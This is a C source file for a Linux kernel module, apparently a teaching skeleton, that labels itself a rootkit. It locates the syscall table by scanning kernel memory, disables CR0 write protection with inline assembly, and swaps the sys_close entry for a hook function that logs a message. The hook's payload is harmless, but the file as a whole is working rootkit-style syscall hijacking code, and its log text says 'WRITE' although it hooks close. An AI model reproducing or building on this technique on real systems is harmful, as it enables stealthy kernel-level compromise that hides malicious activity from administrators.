#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>

#if 0 //64 bits machine //__WORDSIZE == 64
#define KERN_MEM_BEGIN 0xffffffff81000000
#define KERN_MEM_END 0xffffffff81e42000
#else
#define KERN_MEM_BEGIN 0xc0000000
#define KERN_MEM_END 0xd0000000
#endif /* __WORDSIZE == 64 */

unsigned long **find_syscall_table(void)
{
    /*  Find the syscall table 
     *  search in memory the adress of a function of the syscall table (sys_close)
     */
     unsigned long **sctable;
     unsigned long int i = KERN_MEM_BEGIN;
	 
	    while ( i < KERN_MEM_END) {
	 
	        sctable = (unsigned long **)i;
	 
	        if ( sctable[__NR_close] == (unsigned long *) sys_close) {
	 
	            return &sctable[0];
	 
	        }
	         
	        i += sizeof(void *);
	    }
	 
	    return NULL;
     
     
     
}

/* Adress of the syscall table */
unsigned long ** syscall_table ;


/* -------------------------------------------------------------------- */
/*asmlinkage long sys_close(unsigned int fd);
 # define __SYSCALL(nr,func,nargs)
*/

asmlinkage long (*orig_call) (unsigned int fd);

asmlinkage long hacked_call( unsigned int fd)
{
    /* Hacked function */
    
    printk(KERN_ALERT "WRITE HIJACKED");
    return orig_call(fd);
}


/* -------------------------------------------------------------------- */

void disable_wp(void)
{
    __asm__("push   %eax\n\t"
            "mov    %cr0,%eax;\n\t"
            "and     $~(1 << 16),%eax;\n\t"
            "mov    %eax,%cr0;\n\t"
            "wbinvd\n\t"
            "pop    %eax"
           );
           
}

void enable_wp(void)
{

    __asm__("push   %eax\n\t"
            "mov    %cr0,%eax;\n\t"
            "or     $(1 << 16),%eax;\n\t"
            "mov    %eax,%cr0;\n\t"
            "wbinvd\n\t"
            "pop    %eax"
           );
           
}


int init_module(void)
{


    syscall_table = find_syscall_table();

    if (syscall_table == 0)
    {
        printk(KERN_INFO "System call table not found!\n");
        return 1;
    }
    printk(KERN_INFO "System call found at : 0x%lx\n", (unsigned long)syscall_table);

    disable_wp();

/*  Save the adress of the original syscall */
   orig_call= (void *) syscall_table[__NR_close];
   
/*  Replace the syscall in the table */
  syscall_table[__NR_close] = (void*) hacked_call;

   enable_wp(); 

    printk(KERN_INFO "Rootkit is loaded!\n");

    return 0;
}

void cleanup_module(void)
{

    disable_wp();

    /* Set the orignal call*/
  syscall_table[/*  Sycall Number*/ __NR_close] = (void*) orig_call;

    enable_wp(); 

    printk(KERN_INFO "Rootkit is unloaded!\n");
}

MODULE_LICENSE("GPL");

